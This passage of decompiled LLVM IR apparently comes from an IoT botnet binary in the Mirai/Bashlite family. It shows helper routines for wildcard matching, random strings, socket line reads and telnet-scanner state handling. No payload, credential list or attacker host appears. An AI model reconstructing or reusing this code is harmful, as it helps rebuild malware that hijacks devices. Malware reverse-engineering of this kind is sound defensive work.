  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8055da0.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e8d = load i32, i32* @ebp, align 4
  store i32 %v0_8048e8d, i32* %stack_var_-4, align 4
  %v0_8048e91 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e91, i32* %stack_var_-12, align 4
  %v5_8048eaa = ptrtoint i8* %arg1 to i32
  %v5_8048eeb21 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048eeb21, label %dec_label_pc_8048ea5, label %dec_label_pc_8048eed

dec_label_pc_8048ea5:                             ; preds = %entry, %dec_label_pc_8048ea5
  %storemerge22 = phi i32 [ %v4_8048ee2, %dec_label_pc_8048ea5 ], [ 0, %entry ]
  %v6_8048eaa = add i32 %storemerge22, %v5_8048eaa
  store i32 %v6_8048eaa, i32* @ebx, align 4
  %v1_8048ead = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8048ead, i32* @ecx, align 4
  %v2_8048ebd = udiv i32 %v1_8048ead, 26
  %tmp = mul i32 %v2_8048ebd, -10
  %v2_8048ed5 = add i32 %v1_8048ead, %tmp
  %v1_8048edd = add i32 %v2_8048ed5, 65
  %v11_8048edd = trunc i32 %v1_8048edd to i8
  %v2_8048ee0 = load i32, i32* @ebx, align 4
  %v3_8048ee0 = inttoptr i32 %v2_8048ee0 to i8*
  store i8 %v11_8048edd, i8* %v3_8048ee0, align 1
  %v4_8048ee2 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8048ee2, %arg2
  br i1 %exitcond, label %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, label %dec_label_pc_8048ea5

dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge: ; preds = %dec_label_pc_8048ea5
  %v2_8048ef0.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8048ef2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048eed

dec_label_pc_8048eed:                             ; preds = %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, %entry
  %v2_8048ef2 = phi i32 [ %v2_8048ef2.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e8d, %entry ]
  %v2_8048ef0 = phi i32 [ %v2_8048ef0.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e91, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048ef0, i32* @ebx, align 4
  store i32 %v2_8048ef2, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048ee2, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048ea5, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048ef7 = load i32, i32* @edi, align 4
  store i32 %v0_8048ef7, i32* %stack_var_-8, align 4
  %v1_8048f04 = inttoptr i32 %tmp19 to i8*
  %v1_8048f09 = and i32 %tmp19, -256
  store i32 %v1_8048f09, i32* %eax.global-to-local, align 4
  %v5_8048f0b = call i8* @_memset(i8* %v1_8048f04, i32 %v1_8048f09, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8048f2b = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048f2b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048f32 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_8048f3f = udiv i32 %tmp15, 32
  %v1_8048f45 = urem i32 %tmp15, 32
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048f48 = load i32, i32* @ebp, align 4
  %v2_8048f48 = mul nuw nsw i32 %v2_8048f3f, 4
  %v3_8048f48 = add nsw i32 %v2_8048f48, -164
  %v4_8048f48 = add i32 %v3_8048f48, %v0_8048f48
  %v5_8048f48 = inttoptr i32 %v4_8048f48 to i32*
  %v6_8048f48 = load i32, i32* %v5_8048f48, align 4
  %v9_8048f48 = shl i32 1, %v1_8048f45
  %v12_8048f48 = or i32 %v6_8048f48, %v9_8048f48
  store i32 %v12_8048f48, i32* %v5_8048f48, align 4
  %v1_8048f53 = add i32 %tmp15, 1
  %v2_8048f57 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8048f6f = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8048f6f, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048f6f, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_804901f, label %dec_label_pc_8049015.preheader

dec_label_pc_8049015.preheader:                   ; preds = %entry
  %v7_804901945 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804901945, label %dec_label_pc_804901f, label %dec_label_pc_8048f89.lr.ph

dec_label_pc_8048f89.lr.ph:                       ; preds = %dec_label_pc_8049015.preheader
  br label %dec_label_pc_8048f89

dec_label_pc_8048f89:                             ; preds = %dec_label_pc_8048f89.lr.ph, %dec_label_pc_8049012
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_8048f89.lr.ph ], [ %v4_8049012, %dec_label_pc_8049012 ]
  %v0_8048f89 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_8048f89, i32* %eax.global-to-local, align 4
  %v3_8048f97 = call i32 @Rootsprintf(i32 %v0_8048f89, i32 ptrtoint ([5 x i8]* @global_var_80561a0.19 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8048f2b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048fc4 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048fda = load i32, i32* @ebp, align 4
  %v4_8048fda = add i32 %v3_8048f48, %v0_8048fda
  %v5_8048fda = inttoptr i32 %v4_8048fda to i32*
  %v6_8048fda = load i32, i32* %v5_8048fda, align 4
  %v12_8048fda = or i32 %v6_8048fda, %v9_8048f48
  store i32 %v12_8048fda, i32* %v5_8048fda, align 4
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8049001 = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8049001, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049001, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_804901f, label %dec_label_pc_8049012

dec_label_pc_8049012:                             ; preds = %dec_label_pc_8048f89
  %v4_8049012 = add nsw i32 %stack_var_-36.046, 1
  %v7_8049019 = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_8049019, label %dec_label_pc_804901f, label %dec_label_pc_8048f89

dec_label_pc_804901f:                             ; preds = %dec_label_pc_8049015.preheader, %dec_label_pc_8048f89, %dec_label_pc_8049012, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_8049037 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049079

dec_label_pc_804902e:                             ; preds = %dec_label_pc_8049079
  %v0_804902e = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804902e, i32* %eax.global-to-local, align 4
  %v5_804903f = call i32 @__libc_recv(i32 %v0_804902e, i32 %v2_8049037, i32 1, i32 0)
  store i32 %v5_804903f, i32* %eax.global-to-local, align 4
  %v9_8049047 = icmp eq i32 %v5_804903f, 1
  br i1 %v9_8049047, label %dec_label_pc_804905e, label %dec_label_pc_804904c

dec_label_pc_804904c:                             ; preds = %dec_label_pc_804902e
  %v4_804904c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_804904c, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049096

dec_label_pc_804905e:                             ; preds = %dec_label_pc_804902e
  %v3_804905e = load i8, i8* %stack_var_-177, align 1
  %v4_804905e = sext i8 %v3_804905e to i32
  store i32 %v4_804905e, i32* %eax.global-to-local, align 4
  %v4_8049064 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_804905e, i8* %stack_var_-32.0, align 1
  %v5_8049069 = add i32 %v4_8049064, 1
  %v22_8049069 = inttoptr i32 %v5_8049069 to i8*
  %v3_804906c = load i8, i8* %stack_var_-177, align 1
  %v4_804906c = sext i8 %v3_804906c to i32
  %v6_804906c = load i32, i32* %eax.global-to-local, align 4
  %v7_804906c = and i32 %v6_804906c, -256
  %v8_804906c = or i32 %v7_804906c, %v4_804906c
  store i32 %v8_804906c, i32* %eax.global-to-local, align 4
  %v10_8049072 = icmp eq i8 %v3_804906c, 10
  br i1 %v10_8049072, label %dec_label_pc_8049087, label %dec_label_pc_8049076

dec_label_pc_8049076:                             ; preds = %dec_label_pc_804905e
  %v4_8049076 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049079

dec_label_pc_8049079:                             ; preds = %dec_label_pc_804901f, %dec_label_pc_8049076
  %v7_804907d = phi i32 [ %tmp19, %dec_label_pc_804901f ], [ %v8_804906c, %dec_label_pc_8049076 ]
  %stack_var_-32.0 = phi i8* [ %v1_8048f04, %dec_label_pc_804901f ], [ %v22_8049069, %dec_label_pc_8049076 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804901f ], [ %v4_8049076, %dec_label_pc_8049076 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_804901f ], [ %v4_8049079, %dec_label_pc_8049076 ]
  %v4_8049079 = add i32 %stack_var_12.0, -1
  %v9_8049079 = sub i32 0, %stack_var_12.0
  %v10_8049079 = and i32 %stack_var_12.0, %v9_8049079
  %v11_8049079 = icmp slt i32 %v10_8049079, 0
  %v12_8049079 = icmp eq i32 %v4_8049079, 0
  %v13_8049079 = icmp slt i32 %v4_8049079, 0
  %v3_804907d = icmp eq i1 %v13_8049079, %v11_8049079
  %v4_804907d = icmp eq i1 %v12_8049079, false
  %v5_804907d = and i1 %v4_804907d, %v3_804907d
  %v6_804907d = zext i1 %v5_804907d to i32
  %v8_804907d = and i32 %v7_804907d, -256
  %v9_804907d = or i32 %v6_804907d, %v8_804907d
  store i32 %v9_804907d, i32* %eax.global-to-local, align 4
  %v4_8049083 = icmp eq i1 %v5_804907d, false
  %v1_8049085 = icmp eq i1 %v4_8049083, false
  br i1 %v1_8049085, label %dec_label_pc_804902e, label %dec_label_pc_8049087

dec_label_pc_8049087:                             ; preds = %dec_label_pc_804905e, %dec_label_pc_8049079
  %stack_var_-32.1 = phi i8* [ %v22_8049069, %dec_label_pc_804905e ], [ %stack_var_-32.0, %dec_label_pc_8049079 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049096

dec_label_pc_8049096:                             ; preds = %dec_label_pc_804904c, %dec_label_pc_8049087
  %storemerge = phi i32 [ -1, %dec_label_pc_804904c ], [ %stack_var_-28.0, %dec_label_pc_8049087 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_804909c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804909c, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049079, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8049069, { 1, 0 }
  uselistorder i32 %v1_8048f45, { 2, 1, 0 }
  uselistorder i32 %v2_8048f2b, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_8049096, { 1, 0 }
  uselistorder label %dec_label_pc_8049087, { 1, 0 }
  uselistorder label %dec_label_pc_8049079, { 1, 0 }
  uselistorder label %dec_label_pc_804901f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048f89, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_80490aa = add i32 %tmp1, 4
  %v2_80490aa = inttoptr i32 %v1_80490aa to i32*
  %v3_80490aa = load i32, i32* %v2_80490aa, align 4
  %v1_80490b6 = call i32 @__GI_inet_ntoa(i32 %v3_80490aa)
  ret i32 %v1_80490b6
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80490c3 = load i32, i32* @edi, align 4
  store i32 %v0_80490c3, i32* %stack_var_-8, align 4
  %v1_80490cd = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_80490d2 = and i32 %tmp4, -256
  %v5_80490d4 = call i8* @_memset(i8* %v1_80490cd, i32 %v1_80490d2, i32 %tmp5)
  %v4_80490e2 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_80490f6 = inttoptr i32 %tmp to i32*
  %v3_80490f6 = call i32 @contains_string(i32 %tmp4, i32* %v2_80490f6)
  %v1_80490fe = icmp ne i32 %v3_80490f6, 0
  %storemerge = zext i1 %v1_80490fe to i32
  %v3_8049115 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049115, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8049141 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_8049148 = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_8049155 = udiv i32 %arg1, 32
  %v1_804915b = urem i32 %arg1, 32
  %v0_804915e = load i32, i32* @ebp, align 4
  %v2_804915e = mul nuw nsw i32 %v2_8049155, 4
  %v3_804915e = add nsw i32 %v2_804915e, -140
  %v4_804915e = add i32 %v3_804915e, %v0_804915e
  %v5_804915e = inttoptr i32 %v4_804915e to i32*
  %v6_804915e = load i32, i32* %v5_804915e, align 4
  %v9_804915e = shl i32 1, %v1_804915b
  %v12_804915e = or i32 %v6_804915e, %v9_804915e
  store i32 %v12_804915e, i32* %v5_804915e, align 4
  %v1_8049169 = add i32 %arg1, 1
  %v2_804916d = ptrtoint i32* %stack_var_-152 to i32
  %v5_8049180 = call i32 @__libc_select(i32 %v1_8049169, i32 %v2_8049141, i32 0, i32 0, i32 %v2_804916d)
  %tmp22 = icmp slt i32 %v5_8049180, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8049198, label %dec_label_pc_80491b2

dec_label_pc_8049198:                             ; preds = %entry
  %v4_80491a4 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_80491b2

dec_label_pc_80491b2:                             ; preds = %entry, %dec_label_pc_8049198
  %storemerge = phi i32 [ %v4_80491a4, %dec_label_pc_8049198 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491b2, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_80491c3 = icmp eq i32 %arg2, 0
  %v6_80491c3 = trunc i32 %arg2 to i8
  %v1_80491c7 = icmp eq i1 %v4_80491c3, false
  br i1 %v1_80491c7, label %entry.dec_label_pc_80491da_crit_edge, label %dec_label_pc_80491c9

entry.dec_label_pc_80491da_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80491da

dec_label_pc_80491c9:                             ; preds = %entry
  %v2_80491cc = load i32, i32* %arg1, align 4
  %v1_80491d2 = call i32 @__libc_close(i32 %v2_80491cc)
  br label %dec_label_pc_80491da

dec_label_pc_80491da:                             ; preds = %entry.dec_label_pc_80491da_crit_edge, %dec_label_pc_80491c9
  %v1_80491dd = add i32 %tmp2, 16
